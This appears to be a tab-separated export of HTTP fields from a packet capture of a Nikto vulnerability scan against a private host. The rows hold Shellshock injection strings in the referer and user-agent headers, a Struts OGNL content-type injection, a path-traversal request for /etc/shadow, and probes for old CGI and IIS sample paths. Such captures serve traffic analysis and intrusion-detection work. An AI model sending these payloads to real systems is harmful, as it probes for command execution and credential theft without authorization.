http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									614					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/search		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/search
																	Keep-Alive										192.168.1.101									615					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/search.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/search.cgi
																	Keep-Alive										192.168.1.101									616					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/server.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/server.php
																	Keep-Alive										192.168.1.101									617					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/status		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/status
																	Keep-Alive										192.168.1.101									618					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/sysinfo.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/sysinfo.pl
																	Keep-Alive										192.168.1.101									619					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test
																	Keep-Alive										192.168.1.101									620					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test-cgi
																	Keep-Alive										192.168.1.101									621					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.cgi
																	Keep-Alive										192.168.1.101									622					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test_cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test_cgi.php
																	Keep-Alive										192.168.1.101									623					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.cgi.php
																	Keep-Alive										192.168.1.101									624					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test_cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test_cgi.pl
																	Keep-Alive										192.168.1.101									625					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test-cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test-cgi.pl
																	Keep-Alive										192.168.1.101									626					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.py
																	Keep-Alive										192.168.1.101									627					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.sh
																	Keep-Alive										192.168.1.101									628					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/tmUnblock.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/tmUnblock.cgi
																	Keep-Alive										192.168.1.101									629					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/uname.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/uname.cgi
																	Keep-Alive										192.168.1.101									630					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/viewcvs.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/viewcvs.cgi
																	Keep-Alive										192.168.1.101									631					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/welcome		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/welcome
																	Keep-Alive										192.168.1.101									632					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/whois.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/whois.cgi
																	Keep-Alive										192.168.1.101									633					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/
																	Keep-Alive										192.168.1.101									634						1	http://192.168.1.101/web/../../../../../../../../../../../../etc/shadow		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:dishwasher)				/web/../../../../../../../../../../../../etc/shadow
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101															1	http://192.168.1.101/web/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101									640						1	http://192.168.1.101/web/index.action		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/index.action
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101									643						1	http://192.168.1.101/web/login.action		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/login.action
																	Keep-Alive										192.168.1.101									645						1	http://192.168.1.101/web/cfappman/index.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000013)				/web/cfappman/index.cfm
																	Keep-Alive										192.168.1.101									647						1	http://192.168.1.101/web/cfdocs/examples/cvbeans/beaninfo.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000014)				/web/cfdocs/examples/cvbeans/beaninfo.cfm
																	Keep-Alive										192.168.1.101									649						1	http://192.168.1.101/web/cfdocs/examples/parks/detail.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000015)				/web/cfdocs/examples/parks/detail.cfm
																	Keep-Alive										192.168.1.101									651						1	http://192.168.1.101/web/kboard/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000016)				/web/kboard/
																	Keep-Alive										192.168.1.101									653						1	http://192.168.1.101/web/lists/admin/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000017)				/web/lists/admin/
																	Keep-Alive										192.168.1.101									655						1	http://192.168.1.101/web/splashAdmin.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000018)				/web/splashAdmin.php
																	Keep-Alive										192.168.1.101									657						1	http://192.168.1.101/web/ssdefs/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000019)				/web/ssdefs/
																	Keep-Alive										192.168.1.101									658						1	http://192.168.1.101/web/sshome/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000020)				/web/sshome/
																	Keep-Alive										192.168.1.101									659						1	http://192.168.1.101/web/tiki/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000021)				/web/tiki/
																	Keep-Alive										192.168.1.101									660						1	http://192.168.1.101/web/tiki/tiki-install.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000022)				/web/tiki/tiki-install.php
																	Keep-Alive										192.168.1.101									661						1	http://192.168.1.101/web/scripts/samples/details.idc		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000023)				/web/scripts/samples/details.idc
																	Keep-Alive										192.168.1.101									662						1	http://192.168.1.101/web/_vti_bin/shtml.exe		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000024)				/web/_vti_bin/shtml.exe
																	Keep-Alive										192.168.1.101									663						1	http://192.168.1.101/web/cgi/cgiproc?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000334)				/web/cgi/cgiproc?
																	Keep-Alive										192.168.1.101									664						1	http://192.168.1.101/web/examples/servlet/AUX		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000481)				/web/examples/servlet/AUX
																	Keep-Alive										192.168.1.101									665						1	http://192.168.1.101/web/cfdocs/cfmlsyntaxcheck.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000483)				/web/cfdocs/cfmlsyntaxcheck.cfm
																	Keep-Alive										192.168.1.101									666						1	http://192.168.1.101/web/Config1.htm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000484)				/web/Config1.htm
																	Keep-Alive										192.168.1.101									667						1	http://192.168.1.101/web/contents/extensions/asp/1		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000485)				/web/contents/extensions/asp/1
																	Keep-Alive										192.168.1.101									668						1	http://192.168.1.101/web/WebAdmin.dll?View=Logon		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000486)				/web/WebAdmin.dll?View=Logon
																	Keep-Alive										192.168.1.101									669						1	http://192.168.1.101/web/cgi-win/cgitest.exe		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000489)				/web/cgi-win/cgitest.exe
																	Keep-Alive										192.168.1.101									670						1	http://192.168.1.101/web/cfdocs/snippets/evaluate.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001012)				/web/cfdocs/snippets/evaluate.cfm
																	Keep-Alive										192.168.1.101									671						1	http://192.168.1.101/web/cfide/Administrator/startstop.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001013)				/web/cfide/Administrator/startstop.html
																	Keep-Alive										192.168.1.101									672						1	http://192.168.1.101/web/isapi/count.pl?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001155)				/web/isapi/count.pl?
																	Keep-Alive										192.168.1.101									673						1	http://192.168.1.101/web/counter/1/n/n/0/3/5/0/a/123.gif		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001417)				/web/counter/1/n/n/0/3/5/0/a/123.gif
																	Keep-Alive										192.168.1.101									674						1	http://192.168.1.101/web/iissamples/exair/search/search.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001418)				/web/iissamples/exair/search/search.asp
																	Keep-Alive										192.168.1.101									675						1	http://192.168.1.101/web/iissamples/exair/search/query.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001511)				/web/iissamples/exair/search/query.asp
																	Keep-Alive										192.168.1.101									676						1	http://192.168.1.101/web/scripts/cphost.dll		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002088)				/web/scripts/cphost.dll
																	Keep-Alive										192.168.1.101									677						1	http://192.168.1.101/web/Gozila.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002474)				/web/Gozila.cgi
																	Keep-Alive										192.168.1.101									678						1	http://192.168.1.101/web/iissamples/exair/howitworks/Winmsdp.exe		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003022)				/web/iissamples/exair/howitworks/Winmsdp.exe
																	Keep-Alive										192.168.1.101									679						1	http://192.168.1.101/web/_vti_bin/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003045)				/web/_vti_bin/
																	Keep-Alive										192.168.1.101									680						1	http://192.168.1.101/web/NULL.printer		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003047)				/web/NULL.printer
																	Keep-Alive										192.168.1.101									681						1	http://192.168.1.101/web/iissamples/exair/search/advsearch.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003134)				/web/iissamples/exair/search/advsearch.asp
																	Keep-Alive										192.168.1.101									682						1	http://192.168.1.101/web/cgi-bin/hpnst.exe?c=p+i=SrvSystemInfo.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003328)				/web/cgi-bin/hpnst.exe?c=p+i=SrvSystemInfo.html
																	Keep-Alive										192.168.1.101									683						1	http://192.168.1.101/web/iissamples/exair/howitworks/Code.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003352)				/web/iissamples/exair/howitworks/Code.asp
																	Keep-Alive										192.168.1.101									684						1	http://192.168.1.101/web/iissamples/exair/howitworks/Codebrw1.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003353)				/web/iissamples/exair/howitworks/Codebrw1.asp
																	Keep-Alive										192.168.1.101									685						1	http://192.168.1.101/web/iissamples/exair/howitworks/codebrws.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003375)				/web/iissamples/exair/howitworks/codebrws.asp
																	Keep-Alive										192.168.1.101									686						1	http://192.168.1.101/web/servlet/com.newatlanta.servletexec.JSP10Servlet/..%5c..%5cglobal.asa		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003376)				/web/servlet/com.newatlanta.servletexec.JSP10Servlet/..%5c..%5cglobal.asa
																	Keep-Alive										192.168.1.101									687						1	http://192.168.1.101/web/servlet/com.newatlanta.servletexec.JSP10Servlet/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003377)				/web/servlet/com.newatlanta.servletexec.JSP10Servlet/
																	Keep-Alive										192.168.1.101									688						1	http://192.168.1.101/web/wsman/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006709)				/web/wsman/
